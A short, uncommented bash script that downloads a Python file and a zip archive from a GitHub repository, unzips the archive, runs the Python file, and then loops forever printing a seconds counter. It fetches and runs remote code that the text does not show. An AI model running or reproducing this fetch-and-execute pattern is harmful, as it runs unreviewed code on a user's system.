#!/bin/bash
wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lol.py
wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/grok.zip
unzip grok.zip
python3 lol.py
i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
